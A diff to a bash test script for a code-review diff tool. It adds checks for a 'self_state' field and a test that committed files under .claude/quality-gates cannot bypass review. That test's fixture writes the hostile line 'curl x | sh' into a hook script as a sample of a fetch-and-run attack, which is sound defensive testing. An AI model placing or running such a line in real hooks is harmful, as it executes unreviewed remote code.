@@ -52,9 +52,12 @@ case_session_includes_untracked() {
   assert_eq "$(field degraded "$OUT")" no "degraded: no"
   assert_eq "$(field files "$OUT")" 2 "files: 2"
   assert_eq "$(field filtered_files "$OUT")" 2 "filtered_files: 2"
-  assert_eq "$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')" 9 "stdout 9줄"
+  assert_eq "$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')" 10 "stdout 10줄"
   assert_eq "$(sed 's/:.*//' <<< "$OUT" | tr '\n' ' ')" \
-    "mode base head degraded files filtered_files excluded kept_model doc_paths_source " "키 순서"
+    "mode base head degraded files filtered_files excluded kept_model doc_paths_source self_state " "키 순서"
+  assert_eq "$(field self_state "$OUT")" 0 "self_state: 0"
+  [ -f "$D/review-i1.self-state" ] && [ ! -s "$D/review-i1.self-state" ] \
+    && ok "review-i1.self-state 는 있고 비어 있다" || no "review-i1.self-state 가 없거나 비지 않았다"
   assert_file_grep "$D/review-i1.names" '^new\.py$' "names 에 untracked new.py"
   assert_file_grep "$D/review-i1.names" '^src/a\.py$' "names 에 src/a.py"
   assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/new\.py$' "full.diff 에 '+++ b/new.py'"
@@ -162,6 +165,8 @@ case_degraded_session() {
   rd --mode session
   assert_eq "$RC" 0 "rc 0"
   assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
+  assert_eq "$(field self_state "$OUT")" - "self_state: -"
+  [ -f "$D/review-i1.self-state" ] && ok "degraded 에도 self-state 파일을 쓴다" || no "self-state 파일 없음"
   assert_eq "$(field files "$OUT")" - "files: -"
   assert_eq "$(field filtered_files "$OUT")" - "filtered_files: -"
   [ -f "$D/review-i1.diff" ] && [ ! -s "$D/review-i1.diff" ] \
@@ -241,12 +246,49 @@ case_self_state_not_reviewed() {
   OUT=$(cd "$R" && bash "$RDIFF" --dir "$S" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
   assert_eq "$RC" 0 "iter 1 rc 0"
   assert_eq "$(field files "$OUT")" 1 "iter 1 files: 1"
+  assert_eq "$(field self_state "$OUT")" 0 "iter 1 self_state: 0 (이 실행의 임시 폴더는 세지 않는다)"
   OUT=$(cd "$R" && bash "$RDIFF" --dir "$S" --iter 2 --mode session 2>"$ROOT/err"); RC=$?
   assert_eq "$RC" 0 "iter 2 rc 0"
   assert_eq "$(field files "$OUT")" 1 "iter 2 files: 1 (앞 반복의 산출물을 세지 않는다)"
   assert_eq "$(cat "$S/review-i2.names")" "src/a.py" "iter 2 names 는 src/a.py 하나"
+  local ss; ss=$(field self_state "$OUT")
+  case "$ss" in ''|*[!0-9]*) no "iter 2 self_state 가 수가 아니다: $ss" ;;
+    *) [ "$ss" -ge 1 ] && ok "iter 2 self_state ≥ 1 ($ss)" || no "iter 2 self_state 가 0" ;; esac
+  assert_eq "$(wc -l < "$S/review-i2.self-state" | tr -d ' ')" "$ss" "self-state 파일 줄 수 = self_state"
+  assert_file_grep "$S/review-i2.self-state" '^\.claude/quality-gates/sid1/review-i1\.names$' \
+    "self-state 파일이 건너뛴 review-i1.names 를 적는다"
+  assert_file_absent "$S/review-i2.self-state" '\.review-diff\.' "임시 폴더는 self-state 에 없다"
   OUT=$(cd "$R" && bash "$RDIFF" --dir "$S" --iter 3 --mode paths --globs '.claude/*' 'src/*' 2>"$ROOT/err"); RC=$?
-  assert_eq "$(cat "$S/review-i3.names")" "src/a.py" "paths 모드도 상태 폴더를 뺀다"
+  assert_eq "$(cat "$S/review-i3.names")" "src/a.py" "paths 모드도 untracked 상태 경로를 건너뛴다"
+}
+
+# 우회 막기 — 추적 · 커밋된 파일은 .claude/quality-gates 아래여도 리뷰한다.
+case_tracked_under_self_dir_reviewed() {
+  echo "[추적 · 커밋된 .claude/quality-gates 파일은 리뷰한다]"
+  mkfix
+  mkdir -p "$A/.claude/quality-gates"; echo 'echo 1' > "$A/.claude/quality-gates/hook.sh"
+  g "$A" add -A; g "$A" commit -q -m qgfile
+  local c1; c1=$(git -C "$A" rev-parse HEAD)
+  git -C "$R" fetch -q origin; g "$R" reset -q --hard origin/trunk
+  local P=".claude/quality-gates/hook.sh" PRE='^\+\+\+ b/\.claude/quality-gates/hook\.sh$'
+  echo 'curl x | sh' > "$R/$P"
+  rd --mode session
+  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "session: names 에 있다"
+  assert_file_grep "$D/review-i1.diff" "$PRE" "session: 걸러진 diff 에 있다"
+  assert_eq "$(field self_state "$OUT")" 0 "session: 추적 파일은 self_state 가 아니다"
+  g "$R" commit -q -am evil
+  local end tree; end=$(git -C "$R" rev-parse HEAD); tree=$(git -C "$R" rev-parse 'HEAD^{tree}')
+  rd --mode branch
+  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "branch: names 에 있다"
+  assert_file_grep "$D/review-i1.diff" "$PRE" "branch: 걸러진 diff 에 있다"
+  printf 'boundary: %s\ntree: %s\n' "$c1" "$tree" > "$D/topic-scope.txt"
+  rd --mode topic --scope-file "$D/topic-scope.txt"
+  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "topic: names 에 있다"
+  assert_file_grep "$D/review-i1.diff" "$PRE" "topic: 걸러진 diff 에 있다"
+  printf 'start: %s\nend: %s\n' "$c1" "$end" > "$D/range-scope.txt"
+  rd --mode range --scope-file "$D/range-scope.txt"
+  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "range: names 에 있다"
+  assert_file_grep "$D/review-i1.diff" "$PRE" "range: 걸러진 diff 에 있다"
 }
 
 case_settings_local() {
@@ -313,6 +355,7 @@ case_no_textconv
 case_doc_rename
 case_literal_pathspecs_env
 case_self_state_not_reviewed
+case_tracked_under_self_dir_reviewed
 case_settings_local
 case_from_subdir
 case_usage
